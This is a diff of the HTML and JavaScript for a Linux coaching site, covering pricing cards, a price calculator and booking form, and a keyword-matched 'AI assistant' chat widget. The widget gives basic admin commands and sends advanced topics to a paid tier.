-    <div class="bg-grid"></div>
-    <div class="bg-glow glow-1"></div>
-    <div class="bg-glow glow-2"></div>
-
-    <!-- Navigation -->
-    <nav>
-        <div class="nav-container">
-            <a href="#" class="logo">
-                <i class="fab fa-linux"></i>
-                LinuxMaster
-            </a>
-            <ul class="nav-links">
-                <li><a href="#home">Home</a></li>
-                <li><a href="#pricing">Pricing</a></li>
-                <li><a href="#calculator">Calculator</a></li>
-                <li><a href="#features">Features</a></li>
-                <li><a href="#contact">Contact</a></li>
-            </ul>
-        </div>
-    </nav>
-
-    <!-- Hero Section -->
-    <section class="hero" id="home">
-        <div class="hero-content">
-            <div class="hero-badge">
-                <i class="fas fa-terminal"></i>
-                1-on-1 Expert Linux Coaching
-            </div>
-            <h1>Master the Command Line</h1>
-            <p>Personalized Linux coaching tailored to your distro, skill level, and goals. From Ubuntu to Arch, beginner to sysadmin.</p>
-            <div class="cta-buttons">
-                <a href="#pricing" class="btn btn-primary">
-                    <i class="fas fa-rocket"></i>
-                    View Pricing
-                </a>
-                <a href="#calculator" class="btn btn-secondary">
-                    <i class="fas fa-calculator"></i>
-                    Calculate Cost
-                </a>
-            </div>
-
-            <!-- Terminal Animation -->
-            <div class="terminal-window">
-                <div class="terminal-header">
-                    <div class="terminal-dot dot-red"></div>
-                    <div class="terminal-dot dot-yellow"></div>
-                    <div class="terminal-dot dot-green"></div>
-                    <span style="margin-left: 1rem; color: var(--text-secondary); font-size: 0.85rem;">user@linuxmaster:~</span>
-                </div>
-                <div class="terminal-body" id="terminal">
-                    <div class="terminal-line" style="animation-delay: 0.5s">
-                        <span class="prompt">$</span> <span class="command">sudo apt install knowledge</span>
-                    </div>
-                    <div class="terminal-line" style="animation-delay: 1.5s">
-                        <span class="output">Reading package lists... Done</span>
-                    </div>
-                    <div class="terminal-line" style="animation-delay: 2s">
-                        <span class="output">Building dependency tree... Done</span>
-                    </div>
-                    <div class="terminal-line" style="animation-delay: 2.5s">
-                        <span class="output">The following NEW packages will be installed:</span>
-                    </div>
-                    <div class="terminal-line" style="animation-delay: 3s">
-                        <span class="output">  linux-fundamentals bash-scripting system-administration networking-security</span>
-                    </div>
-                    <div class="terminal-line" style="animation-delay: 3.5s">
-                        <span class="output">0 upgraded, 4 newly installed, 0 to remove and 0 not upgraded.</span>
-                    </div>
-                    <div class="terminal-line" style="animation-delay: 4s">
-                        <span class="output">Need to get <span class="highlight">2,847 hours</span> of expert coaching.</span>
-                    </div>
-                    <div class="terminal-line" style="animation-delay: 4.5s">
-                        <span class="output">After this operation, you will be a <span class="highlight">Linux Master</span>.</span>
-                    </div>
-                    <div class="terminal-line" style="animation-delay: 5s">
-                        <span class="prompt">$</span> <span class="command">_</span><span class="highlight" style="animation: pulse 1s infinite">|</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Pricing Section -->
-    <section class="pricing" id="pricing">
-        <div class="section-header fade-in">
-            <h2>Choose Your Distro</h2>
-            <p>Specialized coaching for every Linux distribution. Prices vary based on complexity and market demand.</p>
-        </div>
-
-        <div class="pricing-grid">
-            <!-- Ubuntu -->
-            <div class="pricing-card fade-in">
-                <div class="distro-icon"><i class="fab fa-ubuntu" style="color: #e95420;"></i></div>
-                <h3 class="distro-name">Ubuntu / Debian</h3>
-                <p class="distro-desc">Perfect for beginners and server environments. Most popular enterprise choice.</p>
-                <div class="price">$45<span>/hour</span></div>
-                <ul class="features">
-                    <li><i class="fas fa-check"></i> APT package management</li>
-                    <li><i class="fas fa-check"></i> Server configuration</li>
-                    <li><i class="fas fa-check"></i> LAMP/LEMP stacks</li>
-                    <li><i class="fas fa-check"></i> Snap & Flatpak</li>
-                    <li><i class="fas fa-check"></i> Desktop customization</li>
-                </ul>
-                <button class="btn btn-primary" style="width: 100%;" onclick="selectDistro('ubuntu')">
-                    <i class="fas fa-shopping-cart"></i> Book Now
-                </button>
-            </div>
-
-            <!-- CentOS/RHEL -->
-            <div class="pricing-card fade-in">
-                <div class="distro-icon"><i class="fab fa-redhat" style="color: #ee0000;"></i></div>
-                <h3 class="distro-name">RHEL / CentOS / Fedora</h3>
-                <p class="distro-desc">Enterprise-grade Linux. Essential for corporate environments and certifications.</p>
-                <div class="price">$55<span>/hour</span></div>
-                <ul class="features">
-                    <li><i class="fas fa-check"></i> YUM/DNF package management</li>
-                    <li><i class="fas fa-check"></i> SELinux configuration</li>
-                    <li><i class="fas fa-check"></i> Systemd deep dive</li>
-                    <li><i class="fas fa-check"></i> RHCSA/RHCE prep</li>
-                    <li><i class="fas fa-check"></i> Enterprise networking</li>
-                </ul>
-                <button class="btn btn-primary" style="width: 100%;" onclick="selectDistro('rhel')">
-                    <i class="fas fa-shopping-cart"></i> Book Now
-                </button>
-            </div>
-
-            <!-- Arch -->
-            <div class="pricing-card fade-in">
-                <div class="popular-badge">POPULAR</div>
-                <div class="distro-icon"><i class="fab fa-linux" style="color: #1793d1;"></i></div>
-                <h3 class="distro-name">Arch / Manjaro</h3>
-                <p class="distro-desc">For power users who want total control. Learn Linux from the ground up.</p>
-                <div class="price">$50<span>/hour</span></div>
-                <ul class="features">
-                    <li><i class="fas fa-check"></i> Manual installation</li>
-                    <li><i class="fas fa-check"></i> Pacman & AUR</li>
-                    <li><i class="fas fa-check"></i> Custom kernels</li>
-                    <li><i class="fas fa-check"></i> Window managers (i3, dwm)</li>
-                    <li><i class="fas fa-check"></i> System optimization</li>
-                </ul>
-                <button class="btn btn-primary" style="width: 100%;" onclick="selectDistro('arch')">
-                    <i class="fas fa-shopping-cart"></i> Book Now
-                </button>
-            </div>
-
-            <!-- Gentoo -->
-            <div class="pricing-card fade-in">
-                <div class="distro-icon"><i class="fab fa-linux" style="color: #54487a;"></i></div>
-                <h3 class="distro-name">Gentoo / LFS</h3>
-                <p class="distro-desc">Ultimate optimization and learning. Compile everything from source.</p>
-                <div class="price">$65<span>/hour</span></div>
-                <ul class="features">
-                    <li><i class="fas fa-check"></i> Portage system</li>
-                    <li><i class="fas fa-check"></i> USE flags & CFLAGS</li>
-                    <li><i class="fas fa-check"></i> Kernel compilation</li>
-                    <li><i class="fas fa-check"></i> Performance tuning</li>
-                    <li><i class="fas fa-check"></i> Linux From Scratch</li>
-                </ul>
-                <button class="btn btn-primary" style="width: 100%;" onclick="selectDistro('gentoo')">
-                    <i class="fas fa-shopping-cart"></i> Book Now
-                </button>
-            </div>
-
-            <!-- Kali -->
-            <div class="pricing-card fade-in">
-                <div class="distro-icon"><i class="fas fa-shield-alt" style="color: #367bf0;"></i></div>
-                <h3 class="distro-name">Kali / Parrot</h3>
-                <p class="distro-desc">Security-focused distributions for penetration testing and cybersecurity.</p>
-                <div class="price">$60<span>/hour</span></div>
-                <ul class="features">
-                    <li><i class="fas fa-check"></i> Penetration testing</li>
-                    <li><i class="fas fa-check"></i> Network scanning</li>
-                    <li><i class="fas fa-check"></i> Exploit development</li>
-                    <li><i class="fas fa-check"></i> Digital forensics</li>
-                    <li><i class="fas fa-check"></i> Wireless security</li>
-                </ul>
-                <button class="btn btn-primary" style="width: 100%;" onclick="selectDistro('kali')">
-                    <i class="fas fa-shopping-cart"></i> Book Now
-                </button>
-            </div>
-
-            <!-- Custom/Other -->
-            <div class="pricing-card fade-in">
-                <div class="distro-icon"><i class="fas fa-cogs" style="color: var(--accent-purple);"></i></div>
-                <h3 class="distro-name">Custom / Other</h3>
-                <p class="distro-desc">Alpine, openSUSE, NixOS, or any other distro. We cover them all.</p>
-                <div class="price">$50<span>/hour</span></div>
-                <ul class="features">
-                    <li><i class="fas fa-check"></i> Any distribution</li>
-                    <li><i class="fas fa-check"></i> Custom workflows</li>
-                    <li><i class="fas fa-check"></i> Container orchestration</li>
-                    <li><i class="fas fa-check"></i> Cloud integration</li>
-                    <li><i class="fas fa-check"></i> Embedded systems</li>
-                </ul>
-                <button class="btn btn-primary" style="width: 100%;" onclick="selectDistro('custom')">
-                    <i class="fas fa-shopping-cart"></i> Book Now
-                </button>
-            </div>
-        </div>
-    </section>
-
-    <!-- Calculator Section -->
-    <section class="calculator" id="calculator">
-        <div class="section-header fade-in">
-            <h2>Price Calculator</h2>
-            <p>Calculate your exact cost based on distro, hours, and skill level. Bulk discounts automatically applied.</p>
-        </div>
-
-        <div class="calc-container fade-in">
-            <div class="calc-grid">
-                <div class="form-group">
-                    <label><i class="fab fa-linux"></i> Distribution</label>
-                    <select id="calc-distro" onchange="calculatePrice()">
-                        <option value="45">Ubuntu / Debian ($45/hr)</option>
-                        <option value="55">RHEL / CentOS / Fedora ($55/hr)</option>
-                        <option value="50" selected>Arch / Manjaro ($50/hr)</option>
-                        <option value="65">Gentoo / LFS ($65/hr)</option>
-                        <option value="60">Kali / Parrot ($60/hr)</option>
-                        <option value="50">Custom / Other ($50/hr)</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label><i class="fas fa-layer-group"></i> Skill Level</label>
-                    <select id="calc-level" onchange="calculatePrice()">
-                        <option value="1">Beginner (1x rate)</option>
-                        <option value="1.2">Intermediate (1.2x rate)</option>
-                        <option value="1.5">Advanced (1.5x rate)</option>
-                        <option value="2">Expert / Certification (2x rate)</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label><i class="fas fa-clock"></i> Hours</label>
-                    <input type="number" id="calc-hours" min="1" max="100" value="10" onchange="calculatePrice()">
-                </div>
-
-                <div class="form-group">
-                    <label><i class="fas fa-users"></i> Session Type</label>
-                    <select id="calc-type" onchange="calculatePrice()">
-                        <option value="1">1-on-1 Private (1x)</option>
-                        <option value="0.7">Group (2-3 people, 0.7x)</option>
-                        <option value="0.5">Team (4+ people, 0.5x)</option>
-                    </select>
-                </div>
-            </div>
-
-            <div class="calc-result">
-                <h3>Estimated Total</h3>
-                <div class="total-price" id="total-price">$500</div>
-                <div class="savings" id="savings-text">Book 10+ hours for 10% off!</div>
-            </div>
-
-            <button class="btn btn-primary" style="width: 100%; margin-top: 1.5rem; justify-content: center;" onclick="openModal()">
-                <i class="fas fa-calendar-check"></i> Schedule Sessions
-            </button>
-        </div>
-    </section>
-
-    <!-- Features Section -->
-    <section class="features-section" id="features">
-        <div class="section-header fade-in">
-            <h2>Why Choose LinuxMaster?</h2>
-            <p>Expert coaching designed around your needs, not a generic curriculum.</p>
-        </div>
-
-        <div class="features-grid">
-            <div class="feature-card fade-in">
-                <div class="feature-icon">
-                    <i class="fas fa-user-tie"></i>
-                </div>
-                <h3>Expert Instructors</h3>
-                <p>Certified professionals with 10+ years of real-world Linux administration experience.</p>
-            </div>
-
-            <div class="feature-card fade-in">
-                <div class="feature-icon">
-                    <i class="fas fa-sliders-h"></i>
-                </div>
-                <h3>Fully Customizable</h3>
-                <p>Your goals, your pace, your distro. We adapt to your specific needs and environment.</p>
-            </div>
-
-            <div class="feature-card fade-in">
-                <div class="feature-icon">
-                    <i class="fas fa-clock"></i>
-                </div>
-                <h3>Flexible Scheduling</h3>
-                <p>Book sessions by the hour. No long-term contracts or commitments required.</p>
-            </div>
-
-            <div class="feature-card fade-in">
-                <div class="feature-icon">
-                    <i class="fas fa-terminal"></i>
-                </div>
-                <h3>Hands-On Labs</h3>
-                <p>Practice on real systems with guided exercises and real-world scenarios.</p>
-            </div>
-
-            <div class="feature-card fade-in">
-                <div class="feature-icon">
-                    <i class="fas fa-certificate"></i>
-                </div>
-                <h3>Certification Prep</h3>
-                <p>Prepare for RHCSA, LPIC, CompTIA Linux+, and other industry certifications.</p>
-            </div>
-
-            <div class="feature-card fade-in">
-                <div class="feature-icon">
-                    <i class="fas fa-headset"></i>
-                </div>
-                <h3>Ongoing Support</h3>
-                <p>Get help between sessions via our community Discord and email support.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- Contact/Footer -->
-    <footer id="contact">
-        <div class="footer-content">
-            <div class="footer-section">
-                <h4><i class="fab fa-linux"></i> LinuxMaster</h4>
-                <p style="color: var(--text-secondary); margin-top: 0.5rem;">Professional Linux coaching for everyone, from hobbyists to enterprise admins.</p>
-            </div>
-            
-            <div class="footer-section">
-                <h4>Distros</h4>
-                <ul>
-                    <li><a href="#pricing">Ubuntu & Debian</a></li>
-                    <li><a href="#pricing">RHEL & Fedora</a></li>
-                    <li><a href="#pricing">Arch & Manjaro</a></li>
-                    <li><a href="#pricing">Gentoo & LFS</a></li>
-                    <li><a href="#pricing">Kali & Security</a></li>
-                </ul>
-            </div>
-
-            <div class="footer-section">
-                <h4>Resources</h4>
-                <ul>
-                    <li><a href="#">Documentation</a></li>
-                    <li><a href="#">Blog</a></li>
-                    <li><a href="#">Community Discord</a></li>
-                    <li><a href="#">FAQ</a></li>
-                </ul>
-            </div>
-
-            <div class="footer-section">
-                <h4>Contact</h4>
-                <ul>
-                    <li><a href="mailto:hello@linuxmaster.dev"><i class="fas fa-envelope"></i> hello@linuxmaster.dev</a></li>
-                    <li><a href="#"><i class="fab fa-discord"></i> Discord Community</a></li>
-                    <li><a href="#"><i class="fab fa-github"></i> GitHub</a></li>
-                    <li><a href="#"><i class="fab fa-twitter"></i> @LinuxMaster</a></li>
-                </ul>
-            </div>
-        </div>
-
-        <div class="footer-bottom">
-            <p> LinuxMaster Coaching. All rights reserved. | Made with <i class="fas fa-heart" style="color: var(--accent-red);"></i> and open source.</p>
-        </div>
-    </footer>
-
-    <!-- Booking Modal -->
-    <div class="modal" id="bookingModal">
-        <div class="modal-content">
-            <button class="modal-close" onclick="closeModal()">&times;</button>
-            <h2><i class="fas fa-calendar-plus"></i> Book Your Session</h2>
-            <p style="color: var(--text-secondary); margin-bottom: 1.5rem;">Fill out the form and we'll get back to you within 24 hours.</p>
-            
-            <form class="modal-form" onsubmit="handleBooking(event)">
-                <input type="text" placeholder="Your Name" required>
-                <input type="email" placeholder="Email Address" required>
-                <select id="modal-distro">
-                    <option value="">Select Distribution</option>
-                    <option value="ubuntu">Ubuntu / Debian</option>
-                    <option value="rhel">RHEL / CentOS / Fedora</option>
-                    <option value="arch">Arch / Manjaro</option>
-                    <option value="gentoo">Gentoo / LFS</option>
-                    <option value="kali">Kali / Parrot</option>
-                    <option value="custom">Custom / Other</option>
-                </select>
-                <select>
-                    <option value="">Skill Level</option>
-                    <option value="beginner">Beginner</option>
-                    <option value="intermediate">Intermediate</option>
-                    <option value="advanced">Advanced</option>
-                    <option value="expert">Expert / Certification</option>
-                </select>
-                <input type="number" placeholder="Number of Hours" min="1" required>
-                <textarea placeholder="What do you want to learn? (optional)"></textarea>
-                <button type="submit" class="btn btn-primary" style="justify-content: center;">
-                    <i class="fas fa-paper-plane"></i> Send Request
-                </button>
-            </form>
-        </div>
-    </div>
-
-    <!-- AI Chat Widget -->
-    <div class="chat-widget" id="chatWidget">
-        <button class="chat-toggle" onclick="toggleChat()">
-            <i class="fas fa-robot"></i>
-            <span class="chat-notification" id="chatNotification">1</span>
-        </button>
-        
-        <div class="chat-container" id="chatContainer">
-            <div class="chat-header">
-                <div class="chat-title">
-                    <i class="fas fa-terminal"></i>
-                    <span>Linux AI Assistant</span>
-                </div>
-                <button class="chat-close" onclick="toggleChat()">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            
-            <div class="chat-messages" id="chatMessages">
-                <div class="message ai-message">
-                    <div class="message-avatar">
-                        <i class="fas fa-robot"></i>
-                    </div>
-                    <div class="message-content">
-                        <p>Hello! I'm your Linux AI assistant. Ask me anything about:</p>
-                        <ul style="margin-top: 0.5rem; padding-left: 1rem;">
-                            <li>Command line & bash scripting</li>
-                            <li>Package management (apt, yum, pacman)</li>
-                            <li>System administration</li>
-                            <li>Distro-specific questions</li>
-                            <li>Customization & theming</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="chat-input-area">
-                <div class="chat-input-wrapper">
-                    <input type="text" 
-                           class="chat-input" 
-                           id="chatInput" 
-                           placeholder="Ask about Linux... (e.g., 'How do I install nginx on Ubuntu?')"
-                           onkeypress="handleChatKeypress(event)">
-                    <button class="chat-send" onclick="sendMessage()">
-                        <i class="fas fa-paper-plane"></i>
-                    </button>
-                </div>
-                <div class="chat-quick-actions">
-                    <button class="quick-btn" onclick="sendQuickQuestion('How do I update packages on Ubuntu?')">Ubuntu Update</button>
-                    <button class="quick-btn" onclick="sendQuickQuestion('What is SELinux?')">SELinux</button>
-                    <button class="quick-btn" onclick="sendQuickQuestion('How to check disk space?')">Disk Space</button>
-                    <button class="quick-btn" onclick="sendQuickQuestion('How do I create a bash script?')">Bash Script</button>
-                </div>
-            </div>
-        </div>
-    </div>
 
     <script>
-        // Price Calculator Logic
-        function calculatePrice() {
-            const baseRate = parseInt(document.getElementById('calc-distro').value);
-            const levelMultiplier = parseFloat(document.getElementById('calc-level').value);
-            const hours = parseInt(document.getElementById('calc-hours').value) || 0;
-            const typeMultiplier = parseFloat(document.getElementById('calc-type').value);
-            
-            let subtotal = baseRate * levelMultiplier * hours * typeMultiplier;
-            
-            // Bulk discounts
-            let discount = 0;
-            let discountText = '';
-            
-            if (hours >= 50) {
-                discount = 0.25;
-                discountText = 'You save 25% with our Enterprise package!';
-            } else if (hours >= 20) {
-                discount = 0.20;
-                discountText = 'You save 20% with our Pro package!';
-            } else if (hours >= 10) {
-                discount = 0.10;
-                discountText = 'You save 10% with 10+ hours!';
-            } else if (hours >= 5) {
-                discount = 0.05;
-                discountText = 'You save 5% with 5+ hours!';
-            } else {
-                discountText = 'Book 5+ hours for 5% off!';
-            }
-            
-            const total = subtotal * (1 - discount);
-            
-            document.getElementById('total-price').textContent = '$' + Math.round(total);
-            document.getElementById('savings-text').textContent = discount > 0 
-                ? discountText + ' (Original: $' + Math.round(subtotal) + ')' 
-                : discountText;
-        }
+        // Session Management
+        let sessionActive = false;
+        let sessionStartTime = null;
+        let sessionTimerInterval = null;
+        let currentTab = 'general';
+        let currentTopic = 'general';
 
-        // Modal Functions
-        function openModal() {
-            document.getElementById('bookingModal').classList.add('active');
-            document.body.style.overflow = 'hidden';
-        }
-
-        function closeModal() {
-            document.getElementById('bookingModal').classList.remove('active');
-            document.body.style.overflow = 'auto';
-        }
-
-        function selectDistro(distro) {
-            openModal();
-            document.getElementById('modal-distro').value = distro;
-        }
-
-        function handleBooking(e) {
-            e.preventDefault();
-            alert('Thanks for your booking request! We will contact you within 24 hours to confirm your sessions.');
-            closeModal();
-        }
-
-        // Close modal on outside click
-        document.getElementById('bookingModal').addEventListener('click', function(e) {
-            if (e.target === this) closeModal();
-        });
-
-        // Scroll Animation Observer
-        const observerOptions = {
-            threshold: 0.1,
-            rootMargin: '0px 0px -50px 0px'
-        };
-
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('visible');
-                }
-            });
-        }, observerOptions);
-
-        document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
-
-        // Smooth Scroll
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                }
-            });
-        });
-
-        // Initialize calculator
-        calculatePrice();
-
-        // Chat Widget Functions
-        function toggleChat() {
-            const container = document.getElementById('chatContainer');
-            const notification = document.getElementById('chatNotification');
+        // Public AI Functions
+        function togglePublicChat() {
+            const container = document.getElementById('publicChatContainer');
             container.classList.toggle('active');
             if (container.classList.contains('active')) {
-                notification.style.display = 'none';
-                document.getElementById('chatInput').focus();
+                document.getElementById('publicChatInput').focus();
             }
         }
 
-        function handleChatKeypress(event) {
+        function handlePublicChatKeypress(event) {
             if (event.key === 'Enter') {
-                sendMessage();
+                sendPublicMessage();
             }
         }
 
-        function sendQuickQuestion(question) {
-            document.getElementById('chatInput').value = question;
-            sendMessage();
+        function sendPublicQuick(question) {
+            document.getElementById('publicChatInput').value = question;
+            sendPublicMessage();
         }
 
-        // Linux Knowledge Base for AI responses
-        const linuxKnowledge = {
-            'ubuntu update': `To update packages on Ubuntu/Debian:
+        // Public AI Knowledge Base (Limited/Basic)
+        const publicKnowledge = {
+            'what is linux': `Linux is a free and open-source operating system kernel created by Linus Torvalds in 1991.
 
+<strong>Key Points:</strong>
+• Linux is the kernel, GNU/Linux is the full OS
+• Free to use, modify, and distribute
+• Powers servers, desktops, phones (Android), and embedded systems
+• Highly secure and stable
+• Command-line based with GUI options
+
+<strong>Popular Distributions:</strong>
+• Ubuntu - Beginner-friendly
+• Fedora - Cutting edge
+• Debian - Stable
+• Arch - Customizable
+
+<i class="fas fa-arrow-right" style="color: var(--accent-orange);"></i> <strong>Want to learn more? Book a session for detailed distro comparisons!</strong>`,
+
+            'basic commands': `<strong>Essential Linux Commands:</strong>
+
+<div class="code-block"># Navigation
+ls          # List files
+cd          # Change directory
+pwd         # Show current location
+
+# File Operations
+cat         # View file content
+cp          # Copy files
+mv          # Move/rename files
+rm          # Remove files
+mkdir       # Create directory
+
+# System Info
+whoami      # Current user
+date        # Current date/time
+uname -a    # System info</div>
+
+<i class="fas fa-lock" style="color: var(--accent-orange);"></i> <strong>Advanced commands available with Premium AI!</strong>`,
+
+            'install software': `<strong>Installing Software:</strong>
+
+Different distros use different package managers:
+
+<strong>Ubuntu/Debian:</strong>
 <div class="code-block">sudo apt update
-sudo apt upgrade
-sudo apt full-upgrade</div>
+sudo apt install package-name</div>
 
-<strong>Explanation:</strong>
-• <code>apt update</code> - Updates package lists
-• <code>apt upgrade</code> - Upgrades installed packages
-• <code>apt full-upgrade</code> - Allows removing old packages if needed`,
+<strong>Basic Steps:</strong>
+1. Update package lists
+2. Install software
+3. Verify installation
 
-            'selinux': `SELinux (Security-Enhanced Linux) is a security module that provides access control security policies.
+<i class="fas fa-arrow-right" style="color: var(--accent-orange);"></i> <strong>Need help with specific software? Premium AI covers 1000+ packages!</strong>`,
 
-<strong>Common commands:</strong>
-<div class="code-block"># Check SELinux status
-getenforce
+            'default': `I'm here to help with basic Linux questions! I can provide:
 
-# View SELinux mode
-sestatus
+• General Linux concepts
+• Basic command tips
+• Getting started guidance
+• Common troubleshooting
 
-# Temporarily set to permissive
-sudo setenforce 0
+<strong>What I cannot provide (Premium only):</strong>
+• Advanced security configurations
+• Certification exam details
+• Enterprise deployment
+• Custom kernel compilation
+• Penetration testing
 
-# View context of files
-ls -Z</div>
-
-<strong>Modes:</strong>
-• Enforcing - Policy is enforced
-• Permissive - Warnings only
-• Disabled - SELinux is off`,
-
-            'disk space': `To check disk space in Linux:
-
-<div class="code-block"># Human-readable format
-df -h
-
-# Check directory size
-du -sh /path/to/directory
-
-# Find large files
-find / -type f -size +100M -exec ls -lh {} \\;
-
-# Check inodes
-df -i</div>
-
-<strong>Key columns:</strong>
-• Size - Total space
-• Used - Used space
-• Avail - Available space
-• Use% - Percentage used`,
-
-            'bash script': `To create a bash script:
-
-<div class="code-block">#!/bin/bash
-
-# This is a comment
-echo "Hello, World!"
-
-# Variables
-NAME="Linux"
-echo "Welcome to $NAME"
-
-# Conditional
-if [ -f "/etc/os-release" ]; then
-    echo "File exists"
-fi</div>
-
-<strong>Make it executable:</strong>
-<div class="code-block">chmod +x script.sh
-./script.sh</div>`,
-
-            'nginx install': `To install Nginx on Ubuntu/Debian:
-
-<div class="code-block">sudo apt update
-sudo apt install nginx
-
-# Start service
-sudo systemctl start nginx
-
-# Enable on boot
-sudo systemctl enable nginx
-
-# Check status
-sudo systemctl status nginx</div>
-
-<strong>Configuration location:</strong> <code>/etc/nginx/nginx.conf</code>
-<strong>Web root:</strong> <code>/var/www/html</code>`,
-
-            'firewall': `UFW (Uncomplicated Firewall) on Ubuntu:
-
-<div class="code-block"># Enable firewall
-sudo ufw enable
-
-# Allow SSH
-sudo ufw allow ssh
-
-# Allow HTTP/HTTPS
-sudo ufw allow 80/tcp
-sudo ufw allow 443/tcp
-
-# Check status
-sudo ufw status verbose
-
-# Deny specific port
-sudo ufw deny 3306</div>
-
-<strong>For RHEL/CentOS (firewalld):</strong>
-<div class="code-block">sudo firewall-cmd --permanent --add-service=http
-sudo firewall-cmd --reload</div>`,
-
-            'user management': `User management commands:
-
-<div class="code-block"># Add user
-sudo adduser username
-
-# Add to sudo group
-sudo usermod -aG sudo username
-
-# Change password
-sudo passwd username
-
-# Delete user
-sudo deluser username
-
-# Switch user
-su - username
-
-# Check current user
-whoami
-id</div>`,
-
-            'permissions': `Linux file permissions explained:
-
-<div class="code-block"># View permissions
-ls -la
-
-# Change permissions
-chmod 755 file.txt
-chmod u+x script.sh
-
-# Change ownership
-sudo chown user:group file.txt
-
-# Recursive change
-sudo chown -R user:group /path</div>
-
-<strong>Permission numbers:</strong>
-• 7 = rwx (read, write, execute)
-• 6 = rw-
-• 5 = r-x
-• 4 = r--
-
-<strong>Order:</strong> Owner | Group | Others`,
-
-            'process management': `Process management commands:
-
-<div class="code-block"># List processes
-ps aux
-
-# Interactive process viewer
-top
-htop
-
-# Find process by name
-pgrep firefox
-
-# Kill process
-kill 1234
-kill -9 1234  # Force kill
-
-# Kill by name
-killall firefox</div>
-
-<strong>Background processes:</strong>
-<div class="code-block"># Run in background
-./script.sh &
-
-# View background jobs
-jobs
-
-# Bring to foreground
-fg %1</div>`,
-
-            'ssh': `SSH (Secure Shell) usage:
-
-<div class="code-block"># Connect to server
-ssh username@hostname
-
-# Connect with specific port
-ssh -p 2222 username@hostname
-
-# Copy file via SCP
-scp file.txt username@host:/path/
-
-# Generate SSH key
-ssh-keygen -t ed25519
-
-# Copy key to server
-ssh-copy-id username@hostname</div>
-
-<strong>Config file:</strong> <code>~/.ssh/config</code>`,
-
-            'package management': `Package managers by distro:
-
-<strong>Ubuntu/Debian (APT):</strong>
-<div class="code-block">sudo apt update
-sudo apt install package
-sudo apt remove package
-sudo apt search package</div>
-
-<strong>RHEL/CentOS (DNF/YUM):</strong>
-<div class="code-block">sudo dnf update
-sudo dnf install package
-sudo dnf remove package</div>
-
-<strong>Arch (Pacman):</strong>
-<div class="code-block">sudo pacman -Syu
-sudo pacman -S package
-sudo pacman -R package</div>`,
-
-            'systemd': `Systemd service management:
-
-<div class="code-block"># Start service
-sudo systemctl start service
-
-# Stop service
-sudo systemctl stop service
-
-# Restart service
-sudo systemctl restart service
-
-# Enable on boot
-sudo systemctl enable service
-
-# Check status
-sudo systemctl status service
-
-# View logs
-journalctl -u service -f</div>
-
-<strong>Boot targets:</strong>
-<div class="code-block">sudo systemctl isolate multi-user.target  # Text mode
-sudo systemctl isolate graphical.target   # GUI mode</div>`,
-
-            'default': `I can help you with Linux topics like:
-
-• Command line basics
-• Package management (apt, dnf, pacman)
-• System administration
-• Shell scripting
-• User and permission management
-• Networking and SSH
-• Service management (systemd)
-• Firewall configuration
-• And much more!
-
-What would you like to learn about?`
+<i class="fas fa-crown" style="color: var(--accent-orange);"></i> <strong>Book a session to unlock Premium AI with advanced knowledge!</strong>`
         };
 
-        function getAIResponse(userMessage) {
+        function getPublicResponse(userMessage) {
             const lowerMsg = userMessage.toLowerCase();
             
-            // Check for keywords in the message
-            for (const [key, response] of Object.entries(linuxKnowledge)) {
-                if (lowerMsg.includes(key)) {
-                    return response;
-                }
+            // Check for keywords
+            if (lowerMsg.includes('what is linux') || lowerMsg.includes('linux')) {
+                return publicKnowledge['what is linux'];
+            }
+            if (lowerMsg.includes('command') || lowerMsg.includes('basic')) {
+                return publicKnowledge['basic commands'];
+            }
+            if (lowerMsg.includes('install') || lowerMsg.includes('software') || lowerMsg.includes('package')) {
+                return publicKnowledge['install software'];
             }
             
-            // Check for partial matches
-            if (lowerMsg.includes('update') || lowerMsg.includes('upgrade')) {
-                return linuxKnowledge['ubuntu update'];
-            }
-            if (lowerMsg.includes('security') || lowerMsg.includes('firewall')) {
-                return linuxKnowledge['firewall'];
-            }
-            if (lowerMsg.includes('install') || lowerMsg.includes('package')) {
-                return linuxKnowledge['package management'];
-            }
-            if (lowerMsg.includes('permission') || lowerMsg.includes('chmod')) {
-                return linuxKnowledge['permissions'];
-            }
-            if (lowerMsg.includes('user') || lowerMsg.includes('adduser')) {
-                return linuxKnowledge['user management'];
-            }
-            if (lowerMsg.includes('process') || lowerMsg.includes('kill') || lowerMsg.includes('top')) {
-                return linuxKnowledge['process management'];
-            }
-            if (lowerMsg.includes('ssh') || lowerMsg.includes('remote')) {
-                return linuxKnowledge['ssh'];
-            }
-            if (lowerMsg.includes('service') || lowerMsg.includes('systemctl')) {
-                return linuxKnowledge['systemd'];
-            }
-            if (lowerMsg.includes('script') || lowerMsg.includes('bash')) {
-                return linuxKnowledge['bash script'];
-            }
-            if (lowerMsg.includes('disk') || lowerMsg.includes('space') || lowerMsg.includes('storage')) {
-                return linuxKnowledge['disk space'];
-            }
-            if (lowerMsg.includes('nginx') || lowerMsg.includes('apache') || lowerMsg.includes('web server')) {
-                return linuxKnowledge['nginx install'];
+            // Check if asking for advanced topics (redirect to premium)
+            if (lowerMsg.includes('selinux') || lowerMsg.includes('security') || 
+                lowerMsg.includes('pentest') || lowerMsg.includes('certification') ||
+                lowerMsg.includes('kernel') || lowerMsg.includes('exploit') ||
+                lowerMsg.includes('hardening') || lowerMsg.includes('enterprise')) {
+                return `<i class="fas fa-lock" style="color: var(--accent-orange);"></i> <strong>This topic requires Premium AI access.</strong>
+
+The question you're asking involves advanced Linux topics that are only available to students who book coaching sessions.
+
+<strong>Available in Premium:</strong>
+• Advanced security & SELinux
+• Penetration testing
+• Certification prep (RHCSA, CEH, LPIC)
+• Kernel compilation
+• Enterprise deployment
+
+<a href="#pricing" onclick="togglePublicChat()" style="color: var(--accent-orange); text-decoration: underline; font-weight: 600;">Book a session to unlock Premium AI</a>`;
             }
             
-            return linuxKnowledge['default'];
+            return publicKnowledge['default'];
         }
 
